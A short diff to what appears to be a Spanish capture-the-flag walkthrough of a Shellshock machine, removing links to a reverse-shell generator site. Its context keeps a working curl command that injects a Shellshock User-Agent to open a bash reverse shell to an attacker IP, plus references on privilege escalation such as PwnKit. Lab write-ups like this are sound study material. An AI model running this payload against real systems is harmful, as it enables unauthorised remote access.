@@ -436,7 +436,6 @@ listening on [any] 443 ...
 ```bash
 curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/Tu_IP/443 0>&1" 'http://10.10.10.56/cgi-bin/user.sh'
 ```
-* Aquí nos apoyamos de la siguiente página web que te genera **Reverse Shells** en casi cualquier lenguaje: <a href="https://www.revshells.com/" target="_blank">Reverse Shell Generator</a>
 
 * Activamos el comando y vemos el resultado:
 ```bash
@@ -905,7 +904,6 @@ Active sessions
 * https://blog.cloudflare.com/inside-shellshock/
 * https://deephacking.tech/shellshock-attack-pentesting-web/
 * https://www.zonasystem.com/2020/07/tipos-de-conexiones-directas-inversas-transferencia-ficheros-netcat-nc.html
-* https://www.revshells.com/
 * https://gtfobins.github.io/gtfobins/perl/#sudo
 * https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
 * https://ine.com/blog/exploiting-pwnkit-cve-20214034
